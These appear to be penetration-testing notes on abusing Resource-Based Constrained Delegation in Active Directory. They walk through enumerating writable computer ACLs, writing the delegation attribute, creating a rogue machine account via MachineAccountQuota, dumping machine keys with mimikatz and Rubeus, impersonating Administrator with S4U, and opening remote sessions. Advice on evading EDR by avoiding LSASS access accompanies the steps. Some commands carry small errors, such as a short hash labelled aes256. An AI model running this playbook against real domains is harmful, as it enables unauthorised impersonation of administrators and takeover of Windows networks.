## Information

RBCD is a modern Kerberos delegation variant in which the destination server (back-end) decides which accounts are allowed to act on behalf of other users; instead of: “Server A says it can delegate to B,” it becomes: “Server B decides who can delegate to it.” The decision point moves from the domain administrator to the resource owner. In RBCD, SPNs are no longer configured on the source server. Everything is now controlled from the destination server through the attribute: `msDS-AllowedToActOnBehalfOfOtherIdentity` (visible as `PrincipalsAllowedToDelegateToAccount`). This attribute is basically a special ACL that defines: “These accounts are allowed to impersonate users when accessing me.” It does not require `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION (T2A4D)` as in classic constrained delegation.

If an attacker obtains write permissions over this attribute, for example `GenericWrite`, `WriteProperty`, or `WriteDacl` on the computer object, they can add an account under their control and allow it to request Kerberos tickets on behalf of other users to that service. This attribute can be modified using Active Directory cmdlets such as `Set-ADComputer`.

- Classic Constrained Delegation: The source service decides which services it can delegate to

> In this model, delegation is defined in the source service attribute: `msDS-AllowedToDelegateTo`

```
[ WEB-SERVER ]
	│
    │  puede delegar hacia
    ▼
┌─────────┐
│ MSSQL   │
│ CIFS    │
│ LDAP    │
└─────────┘
```

- RBCD: The destination server decides who can delegate to it

> In this model, authorization is defined on the destination object through the attribute: `msDS-AllowedToActOnBehalfOfOtherIdentity`

```
	puede delegar hacia este host
		│
		▼
	┌──────────────┐
    │ TRACK01      │
    │ (recurso)    │
    └──────────────┘
	    ▲
	    │
	it-HOSTATTACK$
```

> If you can write to the object, you can configure the delegation yourself

- [ ] Why is it used?
- Ideal in multi-tier application environments (frontend/backend), where you only want to delegate the minimum necessary
- Useful when application administrators do not have domain privileges but do control their own server. It is similar to other granular Windows privileges such as `SeDebug` or `SeTakeOwnership`: only the required permission is granted, not full access

- [ ] Requirements
- Write permissions (`WriteProperty`, `GenericWrite`, or `GenericAll`) over the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target computer
- Control of an account with a registered SPN (another machine, a service account, or a fake machine created through `msDS-MachineAccountQuota`), which by default allows any user to create up to 10 computers in the domain
- High integrity level to execute commands on the machine you control, in order to extract its TGT
- The target machine must have at least one published Kerberos service (an SPN)

## Path 1: ACL Abuse over a Computer Object to Configure RBCD

- [ ] Enumeration

```powershell
$rbcdGUID="3f78c3e5-f79a-46bd-a0b8-9d18116ddc79";$dc=(Resolve-DnsName -Type SRV ("_ldap._tcp.dc._msdcs.$targetDomain") -EA SilentlyContinue | sort Priority,Weight | select -First 1 -ExpandProperty NameTarget).TrimEnd('.');function RSID($sid){try{$o=New-Object System.Security.Principal.SecurityIdentifier($sid);try{$o.Translate([System.Security.Principal.NTAccount]).Value}catch{try{$r=[ADSI]"LDAP://$dc/<SID=$sid>";if($r.distinguishedName){$r.distinguishedName}else{$sid}}catch{$sid}}}catch{$sid}};Get-DomainComputer -Domain $targetDomain | Get-ObjectAcl -ResolveGUIDs | % {$_ | Add-Member NoteProperty Identity (RSID $_.SecurityIdentifier) -Force -PassThru} | ?{(($_.ObjectAceType -eq $rbcdGUID -and $_.ActiveDirectoryRights -match "WriteProperty") -or ($_.ObjectAceType -eq $null -and $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl|WriteOwner" -and $_.Identity -notmatch "Domain Admins|Enterprise Admins|Administrators|SYSTEM|SELF|Domain Controllers|Authenticated Users|Cert Publishers|Terminal Server License Servers|Key Admins|Enterprise Key Admins|Account Operators|Enterprise Read-only Domain Controllers|Creator Owner"))} | select Identity,SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,ObjectDN | fl
```

ACLs are enumerated on `computer` objects to identify identities that can configure Resource-Based Constrained Delegation (RBCD). The search specifically looks for the `WriteProperty` permission over the attribute:

```powershell
msDS-AllowedToActOnBehalfOfOtherIdentity
```

This attribute controls which accounts are allowed to delegate credentials to the host and is identified by the GUID:

```powershell
3f78c3e5-f79a-46bd-a0b8-9d18116ddc79
```

- If an identity has this permission, it can modify the RBCD configuration and abuse S4U2Proxy to impersonate privileged users.
- Broad permissions such as `GenericAll`, `GenericWrite`, `WriteDacl`, or `WriteOwner` are also identified, since they allow full control over the `computer` object and make it possible to enable RBCD indirectly.

- [ ] Exploitation

> `LSASS access` is usually one of the most commonly detected indicators by EDR, so the approach of creating a new host for RBCD is often more stealthy from an operational point of view.

| Attack path          | Action / Phase                                   | Requires LSASS dump / TGT? | Typical events                                                       | Main reason                                     |
| -------------------- | ------------------------------------------------ | -------------------------- | -------------------------------------------------------------------- | ----------------------------------------------- |
| Created host + RBCD  | Computer account creation                        | No                         | 4741                                                                 | Uses an attacker-controlled identity            |
| Created host + RBCD  | Write `msDS-AllowedToActOnBehalfOfOtherIdentity` | No                         | 5136, 4662                                                           | RBCD delegation configuration                   |
| Created host + RBCD  | S4U2Self / S4U2Proxy                             | No                         | 4769                                                                 | Attacker-controlled Kerberos delegation         |
| Existing host + RBCD | Write `msDS-AllowedToActOnBehalfOfOtherIdentity` | Yes                        | 5136, 4662                                                           | Requires compromising an existing host          |
| Existing host + RBCD | LSASS access / TGT extraction                    | Yes                        | 4688 (Rubeus), 4656 / 4663 (LSASS handle), 10 (Sysmon ProcessAccess) | Access to sensitive memory                      |
| Existing host + RBCD | S4U2Self / S4U2Proxy                             | Yes                        | 4769                                                                 | Kerberos delegation after obtaining credentials |

### Existing Host + RBCD

1. Authorize the controlled Kerberos identity on the target resource (RBCD configuration)

```powershell
# Get the AD objects for MAD-WS-1 (already authorized) and MAD-WKSTN-1
$wkstn1 = Get-ADComputer -Identity 'mad-wkstn-1'
$ws1 = Get-ADComputer -Identity 'mad-ws-1'

# Option 1: Add the workstation without removing existing entries
Set-ADComputer -Identity 'mad-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1

# Option 2: Configure RBCD when the attribute is empty
Set-ADComputer -Identity 'mad-fs-1' -PrincipalsAllowedToDelegateToAccount $wkstn1

# Legacy PowerView method
$sid=(Get-DomainComputer MAD-WKSTN-1).ObjectSID; $sd=New-Object System.Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"; $b=New-Object byte[] ($sd.BinaryLength); $sd.GetBinaryForm($b,0); Set-DomainObject -Identity MAD-FS-1 -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$b}
```

> `MAD-WKSTN-1$` is now authorized to delegate identities to `MAD-FS-1`.

2. Verify that the entry was added correctly

```powershell
# Display the accounts currently authorized for RBCD on MAD-FS-1
Get-ADComputer -Identity 'mad-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'mad-dc-1' -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
```

3. On the compromised host `MAD-WKSTN-1`, obtain the machine account Kerberos material (requires high privileges)

```powershell
.\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
.\mimikatz.exe "privilege::debug" "sekurlsa::ekeys"
```

4. Request a service ticket while impersonating a target user for the service hosted on `MAD-FS-1`

```powershell
# TICKET
.\Rubeus.exe s4u /user:MAD-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/mad-fs-1 /nowrap /ticket: /ptt

# AES
.\Rubeus.exe s4u /user:MAD-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/mad-fs-1 /nowrap /aes256: /ptt
```

- `/user:MAD-WKSTN-1$` → Machine account added to the RBCD configuration
- `/impersonateuser:Administrator` → User being impersonated
- `/msdsspn:cifs/mad-fs-1` → Target service SPN
- `/ticket:...` → Kerberos ticket obtained previously

5. Cleanup

```powershell
# AD
Set-ADComputer MAD-FS-1 -Clear msDS-AllowedToActOnBehalfOfOtherIdentity

# POWERVIEW
Set-DomainObject -Identity MAD-DB-1 -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
```

### Created Host + RBCD

Any domain user may be able to obtain an SPN-backed account by abusing `MachineAccountQuota`, which is set to 10 by default and allows the creation of new computer accounts. When a new computer account is created, the operator may assign an SPN during creation or later.

1. Create or control a computer account

```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -Domain domain.local -DomainController IP-DC -MachineAccount mad-attack-1 -Password (ConvertTo-SecureString 'Password123' -AsPlainText -Force) 
```

> You now control `mad-attack-1$`, including its password and associated key material.

2. Resource-Based Constrained Delegation configuration

```powershell
$attack01 = Get-ADComputer -Identity 'mad-attack-1'
Set-ADComputer -Identity mad-fs-1 -PrincipalsAllowedToDelegateToAccount $attack01

# verify
Get-ADComputer -Identity mad-fs-1 -Properties PrincipalsAllowedToDelegateToAccount | select Name,PrincipalsAllowedToDelegateToAccount
# MAD-FS-1    {CN=MAD-ATTACK-1,OU=Member Servers,DC=domain,DC=local}
```

> `mad-fs-1` allows RBCD to `mad-attack-1$`, enabling S4U-based service ticket requests on behalf of privileged users.

3. Obtain the key material for `mad-attack-1$`

```powershell
.\Rubeus.exe hash /password:Password123
# 58A478135A93AC3BF058A5EA0E8FDB71
```

No interactive logon on `mad-attack-1` is required if the password for `mad-attack-1$` is already known, because the Kerberos key material can be derived offline and used later in the delegation flow.

4. Confirm SPNs

```powershell
Get-ADComputer -Identity mad-fs-1 -Properties * | select -ExpandProperty servicePrincipalname
# HTTP/mad-fs-1
```

5. Request a service ticket while impersonating a target user for a service hosted on the destination system

```powershell
.\Rubeus.exe s4u /user:mad-attack-1$ aes256:58A478135A93AC3BF058A5EA0E8FDB71 /msdsspn:HTTP/mad-fs-1 /impersonateuser:Administrator /ptt
```

- Uses S4U2Self + S4U2Proxy
- Obtains a valid TGS
- The domain controller accepts the request because the target resource explicitly allows it
- Result: access to the server in the security context of the impersonated user

6. Remote access to the compromised host

```powershell
Enter-PSSession -ComputerName mad-fs-1
winrs -r:mad-fs-1 cmd
```

> If the `0x8009030e` error appears, it usually indicates an inconsistent Kerberos state in LSASS, often caused by mixed or stale ticket contexts. The usual remediation is to clear the Kerberos state and retry in a clean session (`klist purge`)

7. Cleanup

```powershell
Set-ADComputer -Identity 'mad-fs-1' -PrincipalsAllowedToDelegateToAccount @()
```

## Forma 2: Abuse de RBCD ya configurado desde una identidad autorizada

- [ ] Enumeration

> Pre-existing RBCD exposure → ACL control is not required. The current security context is `MAD-WS-1$`.

```powershell
# ldapsearch
ldapsearch "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity

# AD
Get-ADObject -LDAPFilter "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" -Properties sAMAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity | select sAMAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity
# MAD-FS-1    {CN=MAD-WS-1,OU=Member Servers,DC=domain,DC=local}

# PowerView
Get-DomainObject -LDAPFilter "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" -Properties samaccountname,msds-allowedtoactonbehalfofotheridentity | select samaccountname,msds-allowedtoactonbehalfofotheridentity
```

`MAD-WS-1` is able to perform RBCD-based access against `MAD-FS-1`, which means `MAD-WS-1` is authorized to impersonate users and request access to services hosted on `MAD-FS-1` through RBCD. This may apply to any registered service, such as CIFS, LDAP, HTTP, or MSSQL.

- [ ] Exploitation

1. Obtain the Kerberos ticket material associated with the `MAD-WS-1$` machine context.

```powershell
.\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
# Base64EncodedTicket      : doIFr[...snip...]kNPTQ==
```

2. Request a service ticket while impersonating a target user, such as `Administrator`, for the service hosted on `MAD-FS-1`.

```powershell
.\Rubeus.exe s4u /user:MAD-WS-1$ /impersonateuser:Administrator /msdsspn:cifs/mad-fs-1 /nowrap /ticket:doIFr[...snip...]kNPTQ==
# doIGh[...snip...]nMtMQ==
```

3. Inject the resulting service ticket into the current session.

```powershell
.\Rubeus.exe ptt /ticket:doIGh[...snip...]nMtMQ==
```

4. Access the target SMB resources exposed by `MAD-FS-1`.

```powershell
ls \\mad-fs-1\c$
```

- `/user:MAD-WS-1$` → The machine identity authorized by the RBCD configuration on `MAD-FS-1`
- `/impersonateuser:Administrator` → The user being impersonated
- `/msdsspn:cifs/mad-fs-1` → The target service SPN
- `/ticket:...` → The Kerberos ticket associated with the machine account